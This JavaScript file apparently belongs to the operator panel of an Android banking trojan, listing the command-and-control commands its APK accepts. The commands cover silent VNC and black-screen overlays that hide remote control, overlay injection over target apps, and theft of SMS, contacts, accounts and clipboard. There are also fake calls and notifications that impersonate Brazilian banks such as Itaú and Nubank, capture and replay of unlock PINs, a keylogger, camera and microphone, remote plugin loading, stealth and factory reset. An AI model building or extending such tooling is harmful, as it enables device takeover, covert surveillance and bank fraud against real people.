'use strict';
/**
 * CMD_CATALOG — exact commands from CommandControlService.java switch block.
 * APK reads: action = cmd.has("action") ? cmd.get("action") : cmd.get("type")
 * All names must match the APK case labels verbatim.
 */

const CMD_CATALOG = [
  {
    cat: 'VNC / Screen',
    color: '#7c6af7',
    icon: '🖥',
    cmds: [
      { cmd: 'START_SILENT_VNC',     label: 'Start VNC',            args: [{ key:'enabled', def:'true', type:'bool' }, { key:'quality', def:'50', type:'number', hint:'10-100' }] },
      { cmd: 'STOP_SILENT_VNC',      label: 'Stop VNC' },
      { cmd: 'SET_SILENT_VNC_QUALITY', label: 'Set Quality',        args: [{ key:'quality', def:'50', type:'number', hint:'10-100' }] },
      { cmd: 'FORCE_RESTART_VNC',    label: 'Restart VNC' },
      { cmd: 'SNAP_SCREEN',          label: 'Snapshot' },
      { cmd: 'REQUEST_VNC_FRAME',    label: 'Request Frame' },
      { cmd: 'REQUEST_HIERARCHY',    label: 'Request Hierarchy' },
      { cmd: 'TOGGLE_KILLER_MODE',   label: 'Killer Mode',          args: [{ key:'enabled', def:'true', type:'bool' }] },
      { cmd: 'SCREEN_PERSISTENCE',   label: 'Screen Persistence',   args: [{ key:'enabled', def:'true', type:'bool' }] },
    ]
  },
  {
    cat: 'Black Screen / Overlay',
    color: '#222244',
    icon: '🖤',
    cmds: [
      { cmd: 'BLACK_SCREEN_ON',      label: 'Black Screen ON' },
      { cmd: 'BLACK_SCREEN_OFF',     label: 'Black Screen OFF' },
      { cmd: 'TOGGLE_BLACK_SCREEN',  label: 'Toggle Black Screen',  args: [{ key:'enabled', def:'true', type:'bool' }] },
      { cmd: 'SET_BLACK_SCREEN_OPACITY', label: 'Set Opacity',      args: [{ key:'value', def:'100', type:'number', hint:'10-100' }] },
      { cmd: 'TOGGLE_TOUCH_BLOCK',   label: 'Block Touches',        args: [{ key:'enabled', def:'true', type:'bool' }] },
      { cmd: 'SHOW_APP_UNAVAILABLE', label: 'App Unavailable',      args: [{ key:'package', def:'com.example', hint:'package name' }, { key:'appName', def:'', hint:'display name' }] },
      { cmd: 'SET_BLOCKED_APPS',     label: 'Set Blocked Apps',     args: [{ key:'packages', def:'[]', hint:'JSON array of package names' }] },
      { cmd: 'TOGGLE_BLOCK_APP',     label: 'Block/Unblock App',    args: [{ key:'package', def:'', hint:'package name' }, { key:'blocked', def:'true', type:'bool' }] },
      { cmd: 'ARM_OVERLAY_MAPPING',  label: 'Arm Overlay',          args: [{ key:'package', def:'', hint:'target package' }, { key:'template', def:'', hint:'HTML string or JSON obj' }, { key:'name', def:'', hint:'overlay name' }] },
      { cmd: 'DISARM_OVERLAY_MAPPING', label: 'Disarm Overlay',     args: [{ key:'package', def:'', hint:'target package' }] },
    ]
  },
  {
    cat: 'Gestures / Input',
    color: '#3dba7a',
    icon: '👆',
    cmds: [
      { cmd: 'CLICK',      label: 'Click (x,y)',     args: [{ key:'x', def:'0.5', type:'number', hint:'0.0-1.0 normalised' }, { key:'y', def:'0.5', type:'number', hint:'0.0-1.0 normalised' }, { key:'scale', def:'vnc_norm', hint:'vnc_norm|vnc|raw' }] },
      { cmd: 'SWIPE',      label: 'Swipe',           args: [{ key:'x1', def:'0.5', type:'number' }, { key:'y1', def:'0.8', type:'number' }, { key:'x2', def:'0.5', type:'number' }, { key:'y2', def:'0.2', type:'number' }, { key:'scale', def:'vnc_norm' }] },
      { cmd: 'LONG_PRESS', label: 'Long Press',      args: [{ key:'x', def:'0.5', type:'number' }, { key:'y', def:'0.5', type:'number' }, { key:'duration', def:'800', type:'number', hint:'ms' }, { key:'scale', def:'vnc_norm' }] },
      { cmd: 'TYPE',       label: 'Type Text',       args: [{ key:'text', def:'', hint:'text to inject' }] },
      { cmd: 'BACK',       label: '⬅ Back' },
      { cmd: 'HOME',       label: '⌂ Home' },
      { cmd: 'RECENTS',    label: '⧉ Recents' },
      { cmd: 'WAKEUP',     label: '☀ Wake Screen' },
      { cmd: 'LOCK_DEVICE',label: '🔒 Lock Screen' },
      { cmd: 'NOTIFICATIONS', label: '🔔 Pull Down Notifs' },
      { cmd: 'QUICK_SETTINGS', label: '⚙ Quick Settings' },
      { cmd: 'POWER_MENU', label: '⏻ Power Menu' },
    ]
  },
  {
    cat: 'Data Collection',
    color: '#4a9de0',
    icon: '📡',
    cmds: [
      { cmd: 'GET_DEVICE_INFO',     label: 'Device Info' },
      { cmd: 'GET_INSTALLED_APPS',  label: 'Installed Apps' },
      { cmd: 'GET_SMS_LIST',        label: 'Get SMS' },
      { cmd: 'GET_CONTACTS',        label: 'Get Contacts' },
      { cmd: 'GET_LOCATION',        label: 'Get Location' },
      { cmd: 'GET_ACCOUNTS',        label: 'Get Accounts' },
      { cmd: 'GET_CLIPBOARD',       label: 'Get Clipboard' },
      { cmd: 'GET_FILE_LIST',       label: 'File List',     args: [{ key:'path', def:'/sdcard', hint:'directory path' }] },
    ]
  },
  {
    cat: 'Clipboard',
    color: '#aa55cc',
    icon: '📋',
    cmds: [
      { cmd: 'INJECT_CLIPBOARD', label: 'Inject Clipboard', args: [{ key:'text', def:'', hint:'text to inject' }] },
    ]
  },
  {
    cat: 'Communication',
    color: '#e0b84a',
    icon: '📞',
    cmds: [
      { cmd: 'SEND_SMS',   label: 'Send SMS',          args: [{ key:'phone', def:'', hint:'+1234567890' }, { key:'message', def:'', hint:'message body' }] },
      { cmd: 'DIAL',       label: 'Dial Number',       args: [{ key:'number', def:'', hint:'+1234567890' }] },
      { cmd: 'SPEAK',      label: 'Play Audio',        args: [{ key:'audio', def:'', hint:'base64 PCM 16kHz mono' }] },
    ]
  },
  {
    cat: 'Fake UI / Social Engineering',
    color: '#e05c5c',
    icon: '🎭',
    cmds: [
      { cmd: 'START_FAKE_CALL',       label: 'Fake Call',       args: [
        { key:'callerName', def:'Banco Itaú', hint:'display name' },
        { key:'callerNumber', def:'0800 728 0728' },
        { key:'callerTitle', def:'Gerente de Conta', hint:'subtitle' },
        { key:'bank', def:'itau', hint:'itau|bradesco|santander|nubank|bb|cef|inter' },
        { key:'displayMode', def:'fullscreen', hint:'fullscreen|notification' },
      ]},
      { cmd: 'END_FAKE_CALL',         label: 'End Fake Call' },
      { cmd: 'SEND_FAKE_NOTIFICATION',label: 'Fake Notification', args: [
        { key:'title', def:'Banco Itaú', hint:'notification title' },
        { key:'text', def:'Você possui uma transação pendente.' },
        { key:'bank', def:'itau' },
        { key:'actionOnTap', def:'fake_call', hint:'fake_call|open_app' },
        { key:'sound', def:'true', type:'bool' },
      ]},
      { cmd: 'SHOW_LOCKSCREEN',       label: 'Show Lockscreen',  args: [{ key:'type', def:'PIN', hint:'PIN|PATTERN|PASSWORD' }] },
      { cmd: 'HIDE_LOCKSCREEN',       label: 'Hide Lockscreen' },
      { cmd: 'PLAY_PIN_SEQUENCE',     label: 'Play PIN',         args: [{ key:'pin', def:'1234', hint:'digit sequence' }, { key:'delay', def:'1000', type:'number', hint:'ms between digits' }] },
      { cmd: 'PLAY_PATTERN_SEQUENCE', label: 'Play Pattern',     args: [{ key:'pattern', def:'14789', hint:'node sequence 1-9' }, { key:'delay', def:'1000', type:'number' }] },
      { cmd: 'LOCK_KEY_PRESS',        label: 'Press PIN Key',    args: [{ key:'key', def:'1', hint:'0-9 or C or OK' }] },
    ]
  },
  {
    cat: 'Unlock',
    color: '#3dba7a',
    icon: '🔓',
    cmds: [
      { cmd: 'START_UNLOCK_RECORDING', label: 'Record Unlock' },
      { cmd: 'STOP_UNLOCK_RECORDING',  label: 'Stop Recording' },
      { cmd: 'PLAY_UNLOCK_SEQUENCE',   label: 'Replay Unlock' },
    ]
  },
  {
    cat: 'Surveillance',
    color: '#e07a2a',
    icon: '👁',
    cmds: [
      { cmd: 'TOGGLE_KEYLOGGER',    label: 'Toggle Keylogger',  args: [{ key:'enabled', def:'true', type:'bool' }] },
      { cmd: 'TOGGLE_SCREEN_READER',label: 'Toggle Screen Reader', args: [{ key:'enabled', def:'true', type:'bool' }] },
      { cmd: 'TOGGLE_CAMERA',       label: 'Camera ON/OFF',     args: [{ key:'enabled', def:'true', type:'bool' }] },
      { cmd: 'SWITCH_CAMERA',       label: 'Switch Camera',     args: [{ key:'camera', def:'front', hint:'front|back' }] },
      { cmd: 'TOGGLE_MICROPHONE',   label: 'Mic ON/OFF',        args: [{ key:'enabled', def:'true', type:'bool' }] },
    ]
  },
  {
    cat: 'Device Control',
    color: '#555588',
    icon: '📱',
    cmds: [
      { cmd: 'VIBRATE',               label: 'Vibrate' },
      { cmd: 'VOLUME_UP',             label: 'Volume Up' },
      { cmd: 'VOLUME_DOWN',           label: 'Volume Down' },
      { cmd: 'SET_VOLUME',            label: 'Set Volume',        args: [{ key:'stream', def:'music', hint:'music|ring|alarm|notification|call' }, { key:'volume', def:'70', type:'number', hint:'0-100' }] },
      { cmd: 'SET_BRIGHTNESS',        label: 'Set Brightness',    args: [{ key:'value', def:'80', type:'number', hint:'0-100' }] },
      { cmd: 'SET_RINGER_MODE',       label: 'Ringer Mode',       args: [{ key:'mode', def:'silent', hint:'silent|vibrate|sound' }] },
      { cmd: 'TOGGLE_WIFI',           label: 'Toggle WiFi',       args: [{ key:'enabled', def:'true', type:'bool' }] },
      { cmd: 'SET_TORCH',             label: 'Torch',             args: [{ key:'enabled', def:'true', type:'bool' }] },
      { cmd: 'SET_SCREEN_TIMEOUT',    label: 'Screen Timeout',    args: [{ key:'minutes', def:'30', type:'number', hint:'minutes' }] },
      { cmd: 'RECONNECT_CONNECTION',  label: 'Force Reconnect' },
      { cmd: 'CONFIGURE_ROM',         label: 'Configure ROM (Autostart)' },
    ]
  },
  {
    cat: 'Permissions',
    color: '#4a9de0',
    icon: '🛡',
    cmds: [
      { cmd: 'REQUEST_ADMIN_PERMISSION', label: 'Request Device Admin' },
      { cmd: 'CHECK_ADMIN_STATUS',       label: 'Check Admin Status' },
      { cmd: 'REQUEST_IGNORE_BATTERY',   label: 'Battery Optimization' },
      { cmd: 'REQUEST_OVERLAY_PERMISSION', label: 'Overlay Permission' },
      { cmd: 'OPEN_SETTINGS',            label: 'Open Settings',    args: [{ key:'setting', def:'accessibility', hint:'accessibility|overlay|battery|admin|general' }] },
      { cmd: 'REQUEST_PERMISSION',       label: 'Request Permission', args: [{ key:'permission', def:'accessibility', hint:'accessibility|battery_optimization|overlay|admin' }] },
    ]
  },
  {
    cat: 'App Management',
    color: '#aa55cc',
    icon: '📦',
    cmds: [
      { cmd: 'OPEN_APP',        label: 'Open App',      args: [{ key:'package', def:'com.example.app' }] },
      { cmd: 'UNINSTALL_APP',   label: 'Uninstall App', args: [{ key:'package', def:'com.example.app' }] },
      { cmd: 'FORCE_STOP_APP',  label: 'Force Stop',    args: [{ key:'package', def:'com.example.app' }] },
      { cmd: 'DUPLICATE_APP',   label: 'Clone App',     args: [{ key:'package', def:'com.example.app' }, { key:'text', def:'', hint:'clone package (optional)' }] },
    ]
  },
  {
    cat: 'Plugin System',
    color: '#7c6af7',
    icon: '🔌',
    cmds: [
      { cmd: 'LIST_PLUGINS',  label: 'List Plugins' },
      { cmd: 'LOAD_PLUGIN',   label: 'Load Plugin',   args: [{ key:'url', def:'', hint:'APK URL' }, { key:'pluginId', def:'' }, { key:'className', def:'' }, { key:'sha256', def:'' }] },
      { cmd: 'EXEC_PLUGIN',   label: 'Exec Plugin',   args: [{ key:'pluginId', def:'' }, { key:'pluginAction', def:'' }] },
      { cmd: 'UNLOAD_PLUGIN', label: 'Unload Plugin', args: [{ key:'pluginId', def:'' }] },
    ]
  },
  {
    cat: 'Stealth',
    color: '#333366',
    icon: '👻',
    cmds: [
      { cmd: 'STEALTH_STATUS',    label: 'Stealth Status' },
      { cmd: 'SET_THREAT_LEVEL',  label: 'Set Threat Level', args: [{ key:'level', def:'0', type:'number', hint:'0=none,1=low,2=high' }] },
    ]
  },
  {
    cat: 'Danger Zone',
    color: '#e05c5c',
    icon: '💀',
    cmds: [
      { cmd: 'SELF_DESTRUCT',  label: '💣 Self Destruct (Uninstall Self)' },
      { cmd: 'FORMAT_DEVICE',  label: '💥 Factory Reset (Requires Admin)' },
    ]
  },
];

// Expose for sendCmd calls from other modules
window.CMD_CATALOG = CMD_CATALOG;
